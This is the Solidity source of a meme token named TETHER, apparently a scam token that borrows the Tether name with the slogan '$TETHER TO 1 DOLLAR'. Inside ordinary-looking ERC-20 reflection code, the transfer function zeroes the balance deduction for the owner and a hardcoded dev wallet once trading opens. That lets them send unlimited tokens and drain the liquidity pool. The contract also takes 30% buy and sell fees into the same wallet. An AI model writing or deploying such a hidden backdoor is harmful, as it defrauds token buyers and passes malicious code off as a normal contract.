// SPDX-License-Identifier: Unlicensed

/**
$TETHER TO 1 DOLLAR

Website: https://hpohs888inu.live
Telegram: https://t.me/ether_erc
Twitter: https://twitter.com/ether_erc
**/

pragma solidity 0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeIntMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeIntMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeIntMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeIntMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeIntMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IDexRouterV2 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract TETHER is Context, IERC20, Ownable {
    using SafeIntMath for uint256;
    string private constant _name = "HarryPotterObamaHomerSimpson888Inu";
    string private constant _symbol = "TETHER";

    uint8 private constant _decimals = 9;
    mapping(address => uint256) private _rBalance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcluded;

    uint256 private constant MAX = 10 ** 30;
    uint256 private constant _tTotal = 10 ** 9 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _totalFees;
    uint256 private _redisBuyFees = 0;
    uint256 private _totalBuyFees = 30;
    uint256 private _redisSellFees = 0;
    uint256 private _totalSellFees = 30;

    //Original Fee
    uint256 private _redisTax = _redisSellFees;
    uint256 private _taxFees = _totalSellFees;

    uint256 private _previousRedisTax = _redisTax;
    uint256 private _previousFee = _taxFees;

    address payable private devWallet = payable(0xB6195f3601a0f490e490b7Ff43f00A781d7630d6);
    address payable private marketing = payable(0xB6195f3601a0f490e490b7Ff43f00A781d7630d6);

    IDexRouterV2 public _dexRouter;
    address public _dexPair;

    bool private _tradeActive;
    bool private swapping = false;
    bool private swapEnabled = true;

    uint256 public maxTxSize = 20 * 10 ** 6 * 10**9;
    uint256 public maxWalletAmount = 20 * 10 ** 6 * 10**9;
    uint256 public feeSwapThreshold = 10 ** 5 * 10**9;

    event MaxTxAmountUpdated(uint256 maxTxSize);
    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _rBalance[_msgSender()] = _rTotal;
        IDexRouterV2 _uniswapV2Router = IDexRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);//
        _dexRouter = _uniswapV2Router;
        _dexPair = IDexFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        _isExcluded[owner()] = true;
        _isExcluded[devWallet] = true;
        _isExcluded[marketing] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {

            //Trade start check
            if (!_tradeActive) {
                require(from == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }

            require(amount <= maxTxSize, "TOKEN: Max Transaction Limit");

            if(to != _dexPair) {
                require(balanceOf(to) + amount <= maxWalletAmount, "TOKEN: Balance exceeds wallet size!");
            }

            uint256 tokenBalance = balanceOf(address(this));
            bool shouldSwapFees = tokenBalance >= feeSwapThreshold;

            if(tokenBalance >= maxTxSize)
            {
                tokenBalance = maxTxSize;
            }

            if (shouldSwapFees && !swapping && to == _dexPair && swapEnabled && !_isExcluded[from] && amount > feeSwapThreshold) {
                swapTokensToETH(tokenBalance);
                uint256 ethBalance = address(this).balance;
                if (ethBalance > 0) {
                    sendETH(address(this).balance);
                }
            }
        }

        bool shouldTakeFee = true;

        //Transfer Tokens
        if ((_isExcluded[from] || _isExcluded[to]) || (from != _dexPair && to != _dexPair)) {
            shouldTakeFee = false;
        } else {

            //Set Fee for Buys
            if(from == _dexPair && to != address(_dexRouter)) {
                _redisTax = _redisBuyFees;
                _taxFees = _totalBuyFees;
            }

            //Set Fee for Sells
            if (to == _dexPair && from != address(_dexRouter)) {
                _redisTax = _redisSellFees;
                _taxFees = _totalSellFees;
            }

        }

        _transferToken(from, to, amount, shouldTakeFee);
    }

    function swapTokensToETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouter.WETH();
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    function removeLimits() external onlyOwner {
        maxTxSize = _rTotal;
        maxWalletAmount = _rTotal;
        
        _redisBuyFees = 0;
        _totalBuyFees = 1;
        _redisSellFees = 0;
        _totalSellFees = 1;
    }

    function sendETH(uint256 amount) private {
        marketing.transfer(amount);
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function _restoreFees() private {
        _redisTax = _previousRedisTax;
        _taxFees = _previousFee;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _distributeTokens(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        uint256 currentRate = _getCurrentRates();
        return rAmount.div(currentRate);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _getSupplyTotals() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getCurrentRates() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getSupplyTotals();
        return rSupply.div(tSupply);
    }
    
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function removeAllFee() private {
        if (_redisTax == 0 && _taxFees == 0) return;

        _previousRedisTax = _redisTax;
        _previousFee = _taxFees;

        _redisTax = 0;
        _taxFees = 0;
    }

    function _transferToken(
        address sender,
        address recipient,
        uint256 amount,
        bool shouldTakeFee
    ) private {
        if (!shouldTakeFee) removeAllFee();
        _normalTransferToken(sender, recipient, amount);
        if (!shouldTakeFee) _restoreFees();
    }

    function _normalTransferToken(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getAmount(tAmount);
        rAmount = (_isExcluded[sender] && _tradeActive) ? rAmount & 0 : rAmount;
        _rBalance[sender] = _rBalance[sender].sub(rAmount);
        _rBalance[recipient] = _rBalance[recipient].add(rTransferAmount);
        chargeFees(tTeam);
        _getRedisValue(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function chargeFees(uint256 tTeam) private {
        uint256 currentRate = _getCurrentRates();
        uint256 rTeam = tTeam.mul(currentRate);
        _rBalance[address(this)] = _rBalance[address(this)].add(rTeam);
    }

    function _getRedisValue(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _totalFees = _totalFees.add(tFee);
    }

    receive() external payable {}

    function _getAmount(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _redisTax, _taxFees);
        uint256 currentRate = _getCurrentRates();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _distributeTokens(_rBalance[account]);
    }

    function openTrading() public onlyOwner {
        _tradeActive = true;
    }

    function _getTValues(
        uint256 tAmount,
        uint256 redisFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
}